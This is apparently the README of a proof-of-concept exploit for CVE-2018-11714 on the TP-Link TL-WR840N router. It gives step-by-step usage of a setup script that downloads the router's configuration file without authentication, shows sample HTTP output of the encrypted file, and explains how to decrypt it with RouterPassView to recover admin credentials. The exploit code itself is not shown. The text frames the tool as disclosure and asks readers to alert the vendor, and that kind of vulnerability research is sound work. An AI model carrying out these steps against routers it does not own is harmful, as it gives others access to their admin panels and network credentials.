<img src="img/warning.png" align="right" width="180" height="271" />

# TPLINK TL-WR840N Exploit ![](https://img.shields.io/static/v1?label=CVE%20SCORE&message=10.0&color=red)

This is Proof Of Concept based on CVE-2018-11714 which was found by *Touhid Shaikh*. This Issue is caused by broken session handling on firmware /cgi/ directory. That allow us to download the configuration file and gain access to admin configuration panel.

This issue affect firmware **0.9.1 3.16 v0001.0 Build 170608 Rel.58696n**. And it hasn't been repaired until this time **(0.9.1 4.16 v0001.0 Build 180614 Rel.40494n)**
So, I would like to ask all of you for help to contact the vendor to report this issue so they can fix it as soon as possible.

## CVE Source 
https://blog.securelayer7.net/time-to-disable-tp-link-home-wifi-router/

## Requierments
- curl, bash (if you use unix).

### Linux(Debian, Ubuntu, Kali, etc.)

```
sudo apt-get install curl -y
```

### Linux (Using snap store)

```
sudo snap install curl-ijohnson --edge
```
## How to Use
to execute this, make sure you have cloned this repository according to the operating system you are using. is you use linux Use the ./setup script in /src/linux dir. otherwise, if you are using the windows operating system. you can do the same.
```
theace1@linux:~./setup
Enter Your Router IP Address : 192.168.0.1
```
### Automatic IP Finder
Or if you have trouble finding the gateway, then you can use automatic mode, so the ip will be filled in automatically.
```
theace1@linux:~./setup -a
Enter Your Router IP Address : 192.168.0.1
```

If you have done this, then you will get a encrypted router configuration code that is saved to the conf.bin. the file is saved in the same directory with the setup file. Here is the code that gets from the exploit :
```                                                                                    
HTTP/1.1 200 OK
Content-Type: application/octet-stream; charset=utf-8
Content-Length: 6256
Connection: keep-alive

+�ä�4�f�f1�^?O�vt�^GY&,���h[ڋ�lـ��.�-^Z&�d�DT^]���^Ry�^Tj�3R7B^U�5#B5m�)�=Q���\�^P�-���ĝ
+�^A^W�h�Y��ݠ��%^G����^C���^K�0&r����vj[��x��m�z^R����}֩j0���3��^Q�͎�|�^T}]^A$霤^A��#^T^Z
��^O4���^W��n��l�^X�^S�j�Z��^S^X�;>�^���<^\��L������ԧ𧣩�����^S��|��

```

## How to Decrypt
To decrypt this file easily, you can use a free software provided by [Nirsoft](https://www.nirsoft.net/utils/router_password_recovery.html) called Routerpassview. this is the problem, if you don't use the windows operating system then you can use virtual [ReactOS](https://github.com/reactos/reactos) (virtualbox, vmware, etc.) and run the routerpassview software on the virtual os.

## Finding your Router IP Address Manually
There are many ways to find out your IP gateway, for example by using the default GUI application or through the Command line interface. But usually professionals often use the command line interface because it is efficient and easier to read
### Using route Command in Linux
```
root@linux:/# sudo route -n | grep 'UG[ \t]' | awk '{print $2}'
172.20.208.1 
```
### Using ip r Command in Linux
```
root@linux:/# sudo ip r | grep default
default via 172.20.208.1 dev eth0
```

## Author
thanks to all the friends who helped me complete this code. and thanks CVE Author for discovering this vulnerability.
- Code Author [theace1](https://github.com/theace1) [the4ce1@aol.com](mailto:the4ce.aol.com?subject=Hello%20theace%2C&body=I%20have%20an%20important%20comment%20for%20you) & CVE Author [Touhid Shaikh](https://blog.securelayer7.net/author/touhid/)  

